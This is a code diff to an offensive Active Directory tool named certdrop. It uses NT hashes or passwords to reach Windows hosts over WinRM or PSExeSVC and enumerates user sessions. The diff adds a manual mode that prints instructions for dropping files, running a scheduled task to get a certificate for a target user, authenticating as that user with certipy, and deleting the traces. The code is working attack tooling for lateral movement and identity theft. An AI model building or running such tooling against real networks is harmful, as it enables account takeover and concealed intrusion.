@@ -710,11 +710,13 @@ def connect_winrm(hostname, ip, username, password, nt_hash, domain,
         lm = "0" * 32
         ntlm_file = os.path.join(
             os.environ.get("TMPDIR", "/tmp"), f".ntlm_{uuid.uuid4().hex[:8]}")
+        user_prefix = f"{domain}\\{username}" if domain else username
         with open(ntlm_file, "w") as f:
-            f.write(f"{domain}\\{username}:1000:{lm}:{nt}:[U]:LCT-0\n")
+            f.write(f"{user_prefix}:1000:{lm}:{nt}:[U]:LCT-0\n")
         os.environ["NTLM_USER_FILE"] = ntlm_file
+    auth_user = f"{domain}\\{username}" if domain else username
     return winrm.Session(url,
-                         auth=(f"{domain}\\{username}", password or ""),
+                         auth=(auth_user, password or ""),
                          transport="ntlm",
                          read_timeout_sec=60,
                          operation_timeout_sec=55)
@@ -747,11 +749,34 @@ class SusinternalsExec:
             "and place alongside certdrop.py")
 
     def _build_target_str(self):
-        t = f"{self.domain}/{self.username}"
+        if self.domain:
+            t = f"{self.domain}/{self.username}"
+        else:
+            t = self.username
         if self.password:
             t += f":{self.password}"
         t += f"@{self.target_ip}"
         return t
+
+    @staticmethod
+    def _filter_output(text):
+        # strip control chars (backspace, etc.) injected by psexecsvc pipe handling
+        text = re.sub(r'[\x00-\x09\x0b\x0c\x0e-\x1f]', '', text)
+        text = text.replace('\r', '')
+        lines = text.splitlines(True)
+        filtered = []
+        for line in lines:
+            s = line.strip()
+            if (s.startswith("Impacket ") or s.startswith("Copyright ") or
+                s.startswith("[*]") or s.startswith("[+]") or
+                s.startswith("[!]") or s.startswith("[-]") or
+                s.startswith("Exception in thread") or
+                s.startswith("Traceback ") or s.startswith("File ") or
+                s.startswith("impacket.") or s.startswith("During handling") or
+                s == ""):
+                continue
+            filtered.append(line)
+        return "".join(filtered)
 
     def run_cmd(self, cmd):
         args = [sys.executable, self._script, self._build_target_str(),
@@ -768,8 +793,14 @@ class SusinternalsExec:
         if self.aes_key:
             args.extend(["-aes-key", self.aes_key])
         try:
-            r = subprocess.run(args, capture_output=True, text=True, timeout=300)
-            return r.stdout, r.stderr, r.returncode
+            r = subprocess.run(args, stdin=subprocess.DEVNULL,
+                               capture_output=True, text=True, timeout=300)
+            out = self._filter_output(r.stdout)
+            rc = r.returncode
+            # psexecsvc pipe disconnect after cmd /c exits is expected
+            if rc != 0 and "STATUS_PIPE_DISCONNECTED" in r.stderr:
+                rc = 0
+            return out, r.stderr, rc
         except subprocess.TimeoutExpired:
             return "", "susinternals: command timed out", 1
 
@@ -1126,8 +1157,69 @@ def run_certipy_auth(pfx_path, dc_ip, domain, username=None,
 
 # ── Main ─────────────────────────────────────────────────────────────────────
 
+def run_manual_mode(args):
+    target_user = args.target_user
+    if not target_user:
+        die("--exec-method manual requires -tu/--target-user")
+
+    user_domain = args.domain or "DOMAIN"
+
+    os.makedirs(args.out_dir, exist_ok=True)
+    files = generate_files(
+        target_user, user_domain, args.ca, args.template,
+        args.prefix, args.drop_dir, args.exec_wrapper)
+
+    for fname, data in files.items():
+        path = os.path.join(args.out_dir, fname)
+        with open(path, "wb") as f:
+            f.write(data)
+        info(f"Saved: {path}")
+
+    drop = args.drop_dir
+    prefix = args.prefix
+    task = args.task_name
+    pfx_remote = f"{drop}\\{prefix}.pfx"
+
+    print()
+    info("Manual instructions:")
+    print()
+    print(f"  1. Transfer files to {drop}\\ on target:")
+    for fname in files:
+        print(f"       {fname}")
+    print()
+    print(f"  2. Create and run the scheduled task:")
+    print(f"       schtasks /create /xml \"{drop}\\{prefix}.xml\" /tn \"{task}\" /f")
+    print(f"       schtasks /run /tn \"{task}\"")
+    print()
+    print(f"  3. Wait for PFX to appear:")
+    print(f"       dir \"{pfx_remote}\"")
+    print()
+    print(f"  4. Download {pfx_remote} to this machine")
+    print()
+    print(f"  5. Run certipy auth:")
+    certipy = "certipy-ad"
+    certipy_cmd = f"       {certipy} auth -pfx {prefix}.pfx -dc-ip {args.dc_ip}"
+    if args.domain:
+        certipy_cmd += f" -domain {args.domain}"
+    certipy_cmd += f" -username {target_user}"
+    print(certipy_cmd)
+    print()
+    print(f"  6. Cleanup:")
+    print(f"       schtasks /delete /tn \"{task}\" /f")
+    exts = ".inf .bat .xml .req .cer .rsp .pfx .log .status"
+    print(f"       del {' '.join(f'{drop}\\{prefix}{e}' for e in exts.split())}")
+    print()
+
+
 def main():
     args = parse_args()
+
+    if args.exec_method == "manual":
+        print()
+        print("  certdrop v2.0")
+        print()
+        run_manual_mode(args)
+        return
 
     if not args.password and not args.nt_hash and not args.aes_key:
         import getpass
@@ -1144,13 +1236,20 @@ def main():
     info(f"Target: {hostname} ({ip})")
 
     # ── Connect transport
-    use_susinternals = (args.exec_method == "susinternals")
+    use_susinternals = (args.exec_method == "smb")
 
     if use_susinternals:
-        info("Connecting via susinternals (PSExeSVC)...")
+        info("Connecting via SMB (PSExeSVC)...")
         transport = SusinternalsExec(
             ip, args.username, args.password, args.nt_hash,
             args.domain, args.dc_ip, args.aes_key, args.kerberos)
+        # probe + AD domain in one call (each psexecsvc call is ~15-30s)
+        out, err, rc = _run(transport,
+            'powershell -NonInteractive -Command "(Get-WmiObject Win32_ComputerSystem).Domain"')
+        if rc != 0 and not out.strip():
+            die(f"PSExeSVC connection failed: {err.strip()[:200]}")
+        info("Connected")
+        ad_domain = out.strip() if out.strip() and "." in out.strip() else None
     else:
         auth_type = "Kerberos" if args.kerberos else "NTLM"
         info(f"Connecting via WinRM ({auth_type})...")
@@ -1164,13 +1263,11 @@ def main():
                 die("WinRM connected but probe command failed.")
         except Exception as e:
             die(f"WinRM connection failed: {e}")
-    info("Connected")
-
-    # Resolve AD domain FQDN from target
-    ad_domain = None
-    out, _, _ = _run_ps(transport,
-        '(Get-WmiObject Win32_ComputerSystem).Domain')
-    ad_domain = out.strip() if out.strip() and "." in out.strip() else None
+        info("Connected")
+        ad_domain = None
+        out, _, _ = _run_ps(transport,
+            '(Get-WmiObject Win32_ComputerSystem).Domain')
+        ad_domain = out.strip() if out.strip() and "." in out.strip() else None
 
     # SMB connection
     try:
@@ -1181,6 +1278,8 @@ def main():
         die(f"SMB connection failed: {e}")
 
     # Enumerate sessions and pick target
+    if use_susinternals:
+        info("Enumerating sessions...")
     sessions = enum_sessions(transport)
     if not sessions:
         die("No active user sessions found.")
@@ -1312,8 +1411,8 @@ def parse_args():
 
     exc = p.add_argument_group("execution")
     exc.add_argument("--exec-method", default="winrm",
-        choices=["winrm", "susinternals"],
-        help="Command execution method (default: winrm)")
+        choices=["winrm", "smb", "manual"],
+        help="Command execution method: winrm (default), smb (psexecsvc), or manual (generate files only)")
     exc.add_argument("--exec-wrapper", default="conhost",
         choices=list(EXEC_METHODS),
         help="Bat execution wrapper: conhost|cmd|powershell|wscript (default: conhost)")
